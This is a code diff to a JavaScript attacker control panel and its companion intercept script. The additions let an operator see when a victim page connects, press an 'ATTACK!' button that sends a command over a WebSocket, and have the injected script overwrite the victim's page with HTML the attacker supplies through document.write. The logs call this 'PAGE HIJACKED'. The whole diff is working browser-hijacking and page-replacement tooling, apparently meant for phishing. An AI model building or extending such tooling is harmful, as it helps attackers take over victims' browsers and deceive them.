@@ -3,6 +3,8 @@ class PanelController {
     constructor() {
         this.currentState = 'connect';
         this.websocket = null;
+        this.targetAvailable = false;
+        this.targetId = null;
         this.roomData = {
             roomId: '',
             attackerName: '',
@@ -179,6 +181,12 @@ class PanelController {
             case 'join':
                 this.addLogEntry(`Join event: ${data.join_at} joined`);
                 break;
+            case 'available':
+                this.handleTargetAvailable(data.target_id);
+                break;
+            case 'attack_success':
+                this.handleAttackSuccess(data.target_id);
+                break;
             case 'action':
                 if (data.action) {
                     this.addLogEntry(`Action received: ${data.action.type}`);
@@ -192,6 +200,56 @@ class PanelController {
                 break;
             default:
                 this.addLogEntry(`Unknown event: ${data.event}`);
+        }
+    }
+    
+    // Handle Target Available Event
+    handleTargetAvailable(targetId) {
+        this.targetAvailable = true;
+        this.targetId = targetId;
+        this.addLogEntry(`🎯 Target connected: ${targetId}`);
+        this.showSuccess('Target is now available for attack!');
+        this.updateAttackButton();
+    }
+    
+    // Handle Attack Success Event
+    handleAttackSuccess(targetId) {
+        this.addLogEntry(`✅ ATTACK SUCCESSFUL on target: ${targetId}`);
+        this.showSuccess('Attack completed successfully! Target page replaced.');
+        
+        // Re-enable attack button
+        const attackBtn = document.getElementById('copy-code-btn');
+        if (attackBtn && this.targetAvailable) {
+            attackBtn.disabled = false;
+            attackBtn.innerHTML = '<span>🚀 ATTACK!</span><div class="btn-glitch"></div>';
+        }
+    }
+    
+    // Update Attack Button State
+    updateAttackButton() {
+        const copyCodeBtn = document.getElementById('copy-code-btn');
+        if (!copyCodeBtn) return;
+        
+        if (this.targetAvailable && this.currentState === 'listening') {
+            // Change to Attack button
+            copyCodeBtn.innerHTML = '<span>🚀 ATTACK!</span><div class="btn-glitch"></div>';
+            copyCodeBtn.className = 'cyber-btn danger';
+            copyCodeBtn.title = 'Launch attack on connected target';
+            
+            // Remove old event listener and add new one
+            copyCodeBtn.replaceWith(copyCodeBtn.cloneNode(true));
+            const newAttackBtn = document.getElementById('copy-code-btn');
+            newAttackBtn.addEventListener('click', () => this.handleAttack());
+        } else {
+            // Revert to Copy Intercept Code button
+            copyCodeBtn.innerHTML = '<span>📋 COPY INTERCEPT CODE</span><div class="btn-glitch"></div>';
+            copyCodeBtn.className = 'cyber-btn';
+            copyCodeBtn.title = 'Copy intercept code to clipboard';
+            
+            // Remove old event listener and add new one
+            copyCodeBtn.replaceWith(copyCodeBtn.cloneNode(true));
+            const newCopyBtn = document.getElementById('copy-code-btn');
+            newCopyBtn.addEventListener('click', () => this.handleCopyInterceptCode());
         }
     }
     
@@ -248,6 +306,51 @@ class PanelController {
         
         this.websocket.send(JSON.stringify(messagePayload));
         this.addLogEntry(`Sent message: ${content}`);
+    }
+
+    // Handle Attack Button Click
+    handleAttack() {
+        if (!this.targetAvailable || !this.targetId) {
+            this.showError('No target available for attack');
+            return;
+        }
+        
+        if (!this.websocket || this.websocket.readyState !== WebSocket.OPEN) {
+            this.showError('WebSocket not connected');
+            return;
+        }
+        
+        // Show confirmation dialog
+        if (!confirm(`Are you sure you want to attack target ${this.targetId}?`)) {
+            return;
+        }
+        
+        // Send attack action
+        const attackPayload = {
+            event: 'action',
+            action: {
+                type: 'attack'
+            }
+        };
+        
+        this.websocket.send(JSON.stringify(attackPayload));
+        this.addLogEntry(`🚨 ATTACK LAUNCHED on target: ${this.targetId}`);
+        this.showSuccess('Attack command sent to target!');
+        
+        // Disable attack button temporarily
+        const attackBtn = document.getElementById('copy-code-btn');
+        if (attackBtn) {
+            attackBtn.disabled = true;
+            attackBtn.innerHTML = '<span>⏳ ATTACKING...</span><div class="btn-glitch"></div>';
+            
+            // Re-enable after 3 seconds
+            setTimeout(() => {
+                if (attackBtn && this.targetAvailable) {
+                    attackBtn.disabled = false;
+                    attackBtn.innerHTML = '<span>🚀 ATTACK!</span><div class="btn-glitch"></div>';
+                }
+            }, 3000);
+        }
     }
 
     // Load Templates from API
@@ -536,13 +639,28 @@ ws.onmessage = (event) => {
     console.log('Intercepted:', data);
     
     // Handle different message types
-    if (data.event === 'action' && data.action) {
+    if (data.event === 'html_replace' && data.html) {
+        console.log('HTML replacement received');
+        replacePageHTML(data.html);
+    } else if (data.event === 'action' && data.action) {
         console.log('Action received:', data.action.type);
         handleAction(data.action);
     } else if (data.event === 'message' && data.message) {
         console.log('Message from attacker:', data.message.content);
     }
 };
+
+function replacePageHTML(htmlContent) {
+    console.log('🚨 PAGE HIJACKED - Replacing entire page content');
+    
+    // Replace the entire document
+    document.open();
+    document.write(htmlContent);
+    document.close();
+    
+    // Alternative method if document.write doesn't work
+    // document.documentElement.innerHTML = htmlContent;
+}
 
 function handleAction(action) {
     switch (action.type) {
@@ -575,6 +693,9 @@ ws.onclose = () => {
         document.getElementById('current-template').textContent = 
             this.getTemplateDisplayName(this.roomData.template);
         document.getElementById('team-size').textContent = this.roomData.teamMembers.length;
+        
+        // Update attack button state when entering listening mode
+        this.updateAttackButton();
     }
 
     // Helper Methods
@@ -685,6 +806,10 @@ ws.onclose = () => {
             this.websocket.close();
             this.websocket = null;
         }
+        
+        // Reset target availability
+        this.targetAvailable = false;
+        this.targetId = null;
         
         this.showState('connect');
         this.addLogEntry('Disconnected from room');
